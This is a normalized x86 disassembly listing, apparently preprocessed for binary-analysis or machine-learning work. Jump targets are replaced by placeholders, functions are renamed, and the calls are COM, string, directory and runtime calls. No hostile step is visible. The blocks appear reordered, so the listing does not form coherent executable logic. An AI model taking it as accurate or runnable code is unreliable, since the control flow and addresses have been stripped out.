lea esi [ ebp - 0xd48 ]
mov ebx eax
call sub_4070c0
mov edx [ edi + 0x1c ]
push eax
push ebx
call edx
test eax eax
jne r-xdata
push 0x80004003
call sub_40b3f0
mov al 0x1
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0xd5c ]
test eax eax
je r-xdata
push 0x208
lea ecx [ ebp - 0x8fc ]
push 0x0
push ecx
mov [ ebp - 0xd2c ] 0x0
mov [ ebp - 0xd60 ] 0xffffffff
call sub_413e10
add esp 0xc
push 0x208
lea edx [ ebp - 0x2e4 ]
push 0x0
push edx
call sub_413e10
add esp 0xc
push 0x208
lea eax [ ebp - 0x6f4 ]
push 0x0
push eax
call sub_413e10
add esp 0xc
push 0x208
lea ecx [ ebp - 0xb04 ]
push 0x0
push ecx
call sub_413e10
add esp 0xc
lea edi [ ebp - 0xd48 ]
call sub_404430
lea eax [ ebp - 0xd58 ]
push eax
lea edi [ ebp - 0x30 ]
call sub_401ed0
lea edx [ ebp - 0xd58 ]
mov eax esi
call sub_40ea50
test al al
je r-xdata
mov esi [ ebp - 0xd30 ]
test esi esi
jne r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0xd38 ]
cmp eax edi
je r-xdata
lea edi [ ebp - 0xd58 ]
call sub_404430
lea ecx [ ebp - 0xd7c ]
push ecx
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0xb
mov eax [ ebp - 0xd38 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0xd38 ]
mov [ ebp - 0xd38 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x38 ]
push edx
push esi
call eax
cmp eax edi
jne r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ eax ]
mov edx [ edx + 0x20 ]
lea ecx [ ebp - 0xd7c ]
push ecx
push eax
call edx
test eax eax
jne r-xdata
push 0x80004003
call sub_40b3f0
mov esi [ CreateDirectoryW@IAT ]
push edi
lea edx [ ebp - 0x8fc ]
push edx
call esi
test eax eax
jne r-xdata
mov [ ebp - 0xd4c ] edi
mov [ ebp - 0x4 ] 0xf
mov esi [ ebp - 0xd38 ]
cmp esi edi
je r-xdata
lea edx [ ebp - 0xd7c ]
push edx
call [ VariantClear@IAT ]
mov edi [ ebp - 0xd74 ]
lea eax [ ebp - 0xd60 ]
push eax
call sub_401ed0
push 0x208
mov [ ebp - 0x4 ] 0xc
call sub_40f796
mov esi eax
mov eax [ ebp - 0xd60 ]
add esp 0x4
test eax eax
je r-xdata
lea edx [ ebp - 0x8fc ]
push edx
push 0x104
lea eax [ ebp - 0x4ec ]
push eax
mov edi [ GetLastError@IAT ]
call edi
cmp eax 0xb7
je r-xdata
push 0xc
call sub_4066cf
add esp 0x4
cmp eax edi
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
lea eax [ ebp - 0x4ec ]
lea edx [ eax + 0x2 ]
push 0x0
lea eax [ ebp - 0xd0c ]
push eax
call esi
test eax eax
jne r-xdata
xor eax eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] 0x1
mov [ eax ] edi
jmp r-xdata
push 0x104
push esi
push eax
call [ ExpandEnvironmentStringsW@IAT ]
mov ecx [ ebp - 0xd3c ]
lea edi [ ebp - 0xd60 ]
mov [ ecx ] esi
call sub_404430
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
lea esi [ eax + 0x1 ]
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40f796
add esp 0x4
mov ebx eax
push esi
lea eax [ ebp - 0x4ec ]
push eax
push esi
push ebx
call sub_4010d1
lea eax [ ebp - 0x2e4 ]
add esp 0x10
lea ecx [ eax + 0x2 ]
lea eax [ ebp - 0xd0c ]
push eax
push 0x104
lea ecx [ ebp - 0x4ec ]
push ecx
jmp r-xdata
call edi
cmp eax 0xb7
je r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x1c ]
push eax
push esi
call edx
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0xd48 ] eax
mov [ ebp - 0xd4c ] eax
cmp eax edi
je r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
lea esi [ eax + 0x1 ]
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_40f796
add esp 0x4
mov edi eax
push esi
lea eax [ ebp - 0x2e4 ]
push eax
push esi
push edi
call sub_4010d1
mov eax [ ebp - 0xd2c ]
add esp 0x10
lea ecx [ ebp - 0xd28 ]
call sub_401cf0
mov ecx [ ebp - 0xd3c ]
add ecx 0x4
lea edx [ ebp - 0xd28 ]
mov [ ebp - 0x4 ] 0x23
call sub_40cf30
lea esi [ ebp - 0xd28 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] edi
mov [ ebp - 0x4 ] 0xe
call sub_408a10
cmp [ ebp - 0xd60 ] 0xffffffff
je r-xdata
call sub_413100
add esp 0xc
cmp [ ebp - 0xd2c ] 0x0
je r-xdata
mov ecx [ ebp - 0xd3c ]
mov eax [ ecx ]
push eax
push 0x104
lea edx [ ebp - 0x4ec ]
push edx
jmp r-xdata
lea edi [ ebp - 0xd4c ]
call sub_404430
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0xd5c ]
test eax eax
je r-xdata
lea eax [ ebp - 0xd7c ]
push eax
call [ VariantInit@IAT ]
mov [ ebp - 0x4 ] 0x11
mov eax [ ebp - 0xd38 ]
cmp eax edi
je r-xdata
lea eax [ ebp - 0x6f4 ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x4ec ]
xor esi esi
lea edx [ eax + 0x2 ]
mov ecx [ eax ]
lea edx [ ebp - 0xd7c ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
cmp eax edi
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea eax [ ebp - 0xd7c ]
push eax
call [ VariantClear@IAT ]
push 0xc
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x12
cmp esi edi
je r-xdata
lea eax [ ebp - 0xb04 ]
lea edx [ eax + 0x2 ]
mov edi edi
mov edi [ ebp - 0xd3c ]
cmp [ edi ] esi
je r-xdata
push 0x208
call sub_40f796
add esp 0x4
lea ecx [ ebp - 0x2e4 ]
push ecx
mov esi eax
lea edx [ ebp - 0x4ec ]
push edx
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ wsprintfW@IAT ]
mov edi [ ebp - 0xd3c ]
jmp r-xdata
xor esi esi
lea ecx [ ebp - 0x50 ]
push ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
cmp eax edi
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
mov ecx [ ebp - 0xd60 ]
mov [ ebp - 0xdc0 ] esi
lea esi [ edi + 0x14 ]
lea edi [ ebp - 0xdc4 ]
mov [ ebp - 0xdc4 ] ecx
call sub_401580
push eax
lea edi [ ebp - 0xdd4 ]
mov eax esi
call sub_40f7f0
push 0x208
call sub_40f796
mov edx [ edi ]
add esp 0x4
lea ecx [ ebp - 0x2e4 ]
push ecx
mov esi eax
push edx
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ wsprintfW@IAT ]
add esp 0x10
push 0xc
mov [ ebp - 0x4 ] 0x13
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x14
cmp esi edi
je r-xdata
jmp r-xdata
push 0x208
xor esi esi
xor edi edi
call sub_40f796
add esp 0x4
push 0xc
mov [ ebp - 0xd44 ] eax
call sub_4066cf
mov ebx eax
lea eax [ ebp - 0x4ec ]
add esp 0x4
mov [ ebp - 0xd68 ] ebx
lea edx [ eax + 0x2 ]
xor esi esi
lea edx [ ebp - 0x60 ]
push edx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x11
mov [ ebp - 0xd44 ] esi
mov [ ebp - 0xdb8 ] esi
cmp esi edi
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
push 0xc
mov [ ebp - 0x4 ] 0x15
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi edi
je r-xdata
jmp r-xdata
mov edx [ ebp - 0xd3c ]
cmp [ edx ] esi
je r-xdata
push 0x208
call sub_40f796
add esp 0x4
mov esi eax
lea edx [ ebp - 0x2e4 ]
push edx
lea eax [ ebp - 0x4ec ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
push esi
call [ wsprintfW@IAT ]
push 0x208
call sub_40f796
add esp 0x14
lea edx [ ebp - 0x6f4 ]
mov edi eax
push edx
lea eax [ ebp - 0x4ec ]
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0xd58 ] esi
mov [ ebp - 0xdcc ] esi
cmp esi edi
je r-xdata
mov eax [ ebp - 0xd44 ]
lea edx [ ebp - 0xb04 ]
push edx
push 0x104
push eax
call sub_413100
mov ecx [ ebp - 0xd44 ]
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
mov edi [ ebp - 0xd3c ]
add esp 0xc
add edi 0x24
lea eax [ ebp - 0xd68 ]
mov [ ebx + 0x8 ] ecx
call sub_40b440
push 0x208
call sub_40f796
mov ecx [ ebp - 0xd3c ]
mov edx [ ecx ]
mov esi eax
add esp 0x4
lea eax [ ebp - 0x2e4 ]
push eax
push edx
lea eax [ ebp - 0x20 ]
push eax
push esi
call [ wsprintfW@IAT ]
push 0x208
call sub_40f796
mov edx [ ebp - 0xd3c ]
add esp 0x14
lea ecx [ ebp - 0x6f4 ]
mov edi eax
mov eax [ edx ]
push ecx
push eax
lea ecx [ ebp - 0x20 ]
push ecx
push edi
call [ wsprintfW@IAT ]
add esp 0x10
push 0xc
mov [ ebp - 0x4 ] 0x17
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x18
cmp esi edi
je r-xdata
jmp r-xdata
xor esi esi
lea ecx [ ebp - 0xdc ]
push ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x15
mov [ ebp - 0xd8c ] esi
mov [ ebp - 0xdb0 ] esi
cmp esi edi
je r-xdata
push 0xc
mov [ ebp - 0x4 ] 0x19
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x1a
cmp esi edi
je r-xdata
jmp r-xdata
xor edi edi
mov [ ebp - 0xda0 ] edi
lea edx [ ebp - 0x40 ]
push edx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x17
mov [ ebp - 0xd84 ] esi
mov [ ebp - 0xdb4 ] esi
cmp esi edi
je r-xdata
push 0xc
mov [ ebp - 0x4 ] 0x1b
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x1c
test esi esi
je r-xdata
mov edi esi
mov [ ebp - 0xda0 ] esi
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x74 ]
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x19
mov [ ebp - 0xdac ] edi
test edi edi
je r-xdata
push 0xc
mov [ ebp - 0x4 ] 0x1d
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd40 ] esi
mov [ ebp - 0x4 ] 0x1e
test esi esi
je r-xdata
jmp r-xdata
xor esi esi
lea ecx [ ebp - 0x88 ]
push ecx
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1b
mov [ ebp - 0xd90 ] esi
mov [ ebp - 0xd68 ] esi
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x1f
cmp [ ebp - 0xd48 ] edi
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xd74 ]
push 0xc
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd2c ] esi
mov [ ebp - 0x4 ] 0x20
test esi esi
je r-xdata
mov esi [ ebp - 0xd48 ]
mov eax edi
mov ecx esi
call sub_4033b0
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x1d
mov [ ebp - 0xd98 ] esi
mov [ ebp - 0xd40 ] esi
test esi esi
je r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0xd58 ]
cmp esi eax
je r-xdata
mov [ ebp - 0x4 ] 0x21
mov eax [ esi ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x1f
mov [ ebp - 0xd2c ] esi
test esi esi
je r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0xd74 ]
push 0xc
call sub_4066cf
mov esi eax
add esp 0x4
mov [ ebp - 0xd94 ] esi
mov [ ebp - 0x4 ] 0x22
test esi esi
je r-xdata
mov ecx esi
call sub_4033b0
test eax eax
jne r-xdata
xor eax eax
push eax
call [ SysStringLen@IAT ]
jmp r-xdata
jmp r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call ebx
mov [ esi ] eax
test eax eax
jne r-xdata
lea edx [ ebp - 0xdb0 ]
lea eax [ ebp - 0xd4c ]
call sub_40ea50
test al al
je r-xdata
xor ebx ebx
push eax
call [ SysStringLen@IAT ]
mov ebx eax
jmp r-xdata
inc eax
push eax
call sub_40f796
mov [ ebp - 0xd2c ] eax
mov eax [ esi ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ esi ]
push 0x104
lea ecx [ ebp - 0x2e4 ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
mov [ ebp - 0x4 ] 0x1f
test esi esi
je r-xdata
test edi edi
jne r-xdata
lea edx [ ebp - 0xdb4 ]
lea eax [ ebp - 0xd4c ]
call sub_40ea50
test al al
je r-xdata
mov edi [ ebp - 0xd74 ]
lea ecx [ ebp - 0xd80 ]
push ecx
call sub_401ed0
mov esi [ ebp - 0xd80 ]
test esi esi
je r-xdata
xor eax eax
push eax
call [ SysStringLen@IAT ]
jmp r-xdata
mov edi [ esi ]
mov eax edi
test eax eax
je r-xdata
mov esi [ ebp - 0xd98 ]
mov edi [ InterlockedDecrement@IAT ]
lea edx [ esi + 0x8 ]
push edx
call edi
mov ebx [ SysFreeString@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
jmp r-xdata
lea edx [ ebp - 0xdb8 ]
lea eax [ ebp - 0xd4c ]
call sub_40ea50
test al al
je r-xdata
mov edi [ ebp - 0xd74 ]
lea ecx [ ebp - 0xda4 ]
push ecx
call sub_401ed0
mov eax [ ebp - 0xda4 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ esi ]
jmp r-xdata
xor eax eax
push eax
call [ SysStringLen@IAT ]
jmp r-xdata
mov edx [ ebp - 0xd2c ]
push ebx
push edi
inc eax
push eax
push edx
lea eax [ ebp - 0xdc8 ]
push eax
call sub_40402e
mov eax [ esi ]
add esp 0x14
test eax eax
je r-xdata
mov esi [ ebp - 0xd90 ]
lea eax [ esi + 0x8 ]
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
lea edx [ ebp - 0xd68 ]
lea eax [ ebp - 0xd4c ]
call sub_40ea50
test al al
je r-xdata
mov edi [ ebp - 0xd74 ]
lea eax [ ebp - 0xda8 ]
push eax
call sub_401ed0
mov eax [ eax ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
push 0x104
lea edx [ ebp - 0x8fc ]
push edx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
test esi esi
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp - 0xd2c ]
mov [ eax + ecx ] 0x0
lea eax [ ebp - 0x2e4 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov esi [ ebp - 0xda0 ]
lea ecx [ esi + 0x8 ]
push ecx
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
jmp r-xdata
push eax
call sub_408b16
add esp 0x4
lea edx [ ebp - 0xd40 ]
lea eax [ ebp - 0xd4c ]
call sub_40ea50
test al al
je r-xdata
mov edi [ ebp - 0xd74 ]
lea ecx [ ebp - 0xd88 ]
push ecx
call sub_401ed0
mov eax [ ebp - 0xd88 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
push 0x104
lea edx [ ebp - 0xd0c ]
push edx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
lea edi [ ebp - 0xda4 ]
call sub_404430
jmp r-xdata
mov [ ebp - 0xd80 ] 0x0
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x1
jne r-xdata
mov esi [ ebp - 0xd84 ]
lea edx [ esi + 0x8 ]
push edx
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
mov eax [ ebp - 0xd74 ]
push eax
lea ecx [ ebp - 0xb04 ]
push 0x104
push ecx
call sub_413100
add esp 0xc
xor eax eax
mov eax [ eax ]
jmp r-xdata
push eax
call sub_4130f5
add esp 0x4
lea edi [ ebp - 0xda8 ]
mov [ ebp - 0xd60 ] eax
call sub_404430
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x104
push eax
lea edx [ ebp - 0x2e4 ]
push 0x104
push edx
call sub_4010d1
add esp 0x10
jmp r-xdata
mov esi [ ebp - 0xd8c ]
lea eax [ esi + 0x8 ]
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
push 0x104
lea edx [ ebp - 0x6f4 ]
push edx
push eax
call [ ExpandEnvironmentStringsW@IAT ]
lea edi [ ebp - 0xd88 ]
call sub_404430
jmp r-xdata
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
mov esi [ ebp - 0xd58 ]
lea ecx [ esi + 0x8 ]
push ecx
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
mov esi [ ebp - 0xd44 ]
lea edx [ esi + 0x8 ]
push edx
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
lea eax [ ebp - 0xd7c ]
push eax
call [ VariantClear@IAT ]
mov [ ebp - 0x4 ] 0xe
mov esi [ ebp - 0xd48 ]
lea ecx [ esi + 0x8 ]
push ecx
call edi
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
mov esi [ ebp - 0xd5c ]
mov ebx [ SysAllocString@IAT ]
xor edi edi
cmp esi edi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
push esi
call sub_408b16
add esp 0x4
push eax
call sub_408b16
add esp 0x4
push esi
call sub_408b16
add esp 0x4
jmp r-xdata
push eax
call sub_408b16
add esp 0x4
sub_412f56
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_407759
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40dda0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_410f09
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_413010
push ebp
mov ebp esp
push 0xffffffff
push sub_4164fa
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ ebx + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax esi
ja r-xdata
mov edi [ ebx + 0x4 ]
xor ecx ecx
mov [ ebp - 0x4 ] 0x1
cmp edi ecx
je r-xdata
mov ecx ebx
call sub_404070
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
push ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ecx
mov [ edi ] ax
push esi
mov ecx [ ebx ]
mov edi [ ebx + 0x4 ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp edi ecx
je r-xdata
mov ecx ebx
call sub_404070
xor edx edx
push ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ecx
mov [ edi ] dx
push eax
jmp r-xdata
or eax 0xffffffff
call sub_40a580
sub_413100
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_40f84f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_40f84f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_40c515
mov eax esi
sub_413163
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4016cf
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_4131c0
push ebp
mov ebp esp
sub esp 0x10
push 0x34
mov [ esi + 0xc ] 0x0
call sub_4066cf
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_40140f
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_4037cf
int3
mov [ esi + 0x8 ] eax
mov [ eax ] eax
mov eax [ esi + 0x8 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x8 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x8 ]
mov al 0x1
mov [ ecx + 0x30 ] al
mov edx [ esi + 0x8 ]
mov [ edx + 0x31 ] al
mov eax esi
mov esp ebp
pop ebp
retn
sub_413289
push 0x10
push r--data
call sub_413ff0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_406d2b
and [ eax ] 0x0
call sub_40f84f
mov [ eax ] 0x9
call sub_40c515
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_414035
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40bc2e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40f84f
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40213c
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413345
mov eax [ ebp - 0x1c ]
sub_413364
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_402116
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_403c1d
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_402116
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_401400
leave
retn
push esi
call sub_402116
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_402116
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_402116
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_402116
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_402116
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_402116
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_402116
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_402116
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
